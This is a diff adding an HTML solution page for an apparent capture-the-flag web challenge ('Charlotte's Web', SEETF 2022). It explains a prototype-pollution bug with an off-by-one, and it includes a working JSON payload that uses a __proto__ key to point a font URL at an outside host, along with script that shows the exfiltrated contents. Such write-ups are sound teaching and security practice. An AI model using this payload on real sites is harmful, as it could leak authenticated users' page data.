@@ -1,0 +1,45 @@
+<html>
+
+<head>
+  <link rel="stylesheet" href="/style.css">
+</head>
+
+<body style="margin: auto; max-width: 650px">
+  <div style="margin-top: 30px; height: 40px">
+    <h1 style="float: left; margin: 0; padding-right: 10px">Charlotte's Web Solution</h1>
+  </div>
+  <hr>
+  <p>
+    <ol>
+      <li>Prototype pollution in <code>utils.merge()</code> and an off-by-one error lets us pollute <code>utils.FONTS[10]</code> through <code>page-settings</code>.</li>
+      <li>In the actual CTF challenge, the secret page is authenticated. Pollute <code>credentials: include</code> through <code>page-style</code> to include the necessary cookies.</li>
+    </ol>
+  </p>
+  <p>
+    <a href="https://github.com/zeyu2001/My-CTF-Challenges/tree/main/SEETF-2022/web/charlottes-web/solve/solve.md"
+      target="_blank">Full Solution</a>
+    | <a href="/">Home</a>
+  </p>
+  <h2>Exfiltrated Contents</h2>
+  <p id="result"></p>
+  <div id="page-settings">
+    {
+        "fontSize": "100%",
+        "font": "https://xss-playground-challenges.vercel.app/charlotte/",
+        "__proto__": {
+            "10": "https://xss-playground-challenges.vercel.app/charlotte/"
+        }
+    }
+  </div>
+  <div id="page-style">
+    {}
+  </div>
+  <script>
+      setTimeout(() => {
+          const style = document.querySelector('style');
+          document.getElementById('result').innerText = style.innerText;
+      }, 2000);
+  </script>
+</body>
+
+</html>
